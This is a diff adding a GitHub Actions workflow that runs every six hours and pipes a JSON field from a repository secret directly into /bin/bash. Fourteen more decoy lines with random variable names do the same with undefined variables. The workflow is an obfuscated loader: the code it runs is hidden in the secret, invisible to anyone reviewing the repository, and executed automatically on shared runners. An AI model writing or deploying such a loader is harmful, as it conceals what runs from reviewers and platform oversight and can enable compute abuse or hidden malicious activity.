@@ -1,0 +1,30 @@
+name: taishangwq
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taishangwq
+        env:
+          jxpj848: ${{ secrets.jxpj848 }}
+        run: |
+          echo $jxpj848 | jq -r .wg2694 | /bin/bash
+          echo $fjdj2 | jq -r .puixh77237 | /bin/bash
+          echo $zrd7202 | jq -r .d7217 | /bin/bash
+          echo $r03 | jq -r .invb57791 | /bin/bash
+          echo $e09104 | jq -r .rv305 | /bin/bash
+          echo $mvyz01078 | jq -r .jto102 | /bin/bash
+          echo $xipol3 | jq -r .au77738 | /bin/bash
+          echo $zn6 | jq -r .r9 | /bin/bash
+          echo $kbbn9169 | jq -r .u6115 | /bin/bash
+          echo $ixu94 | jq -r .spx5767 | /bin/bash
+          echo $czdqp969 | jq -r .vagoj005 | /bin/bash
+          echo $tfng12 | jq -r .wihk9606 | /bin/bash
+          echo $eab72000 | jq -r .ioaw83 | /bin/bash
+          echo $oyo91056 | jq -r .oe3 | /bin/bash
+          echo $bi5712 | jq -r .qnojj71410 | /bin/bash
+
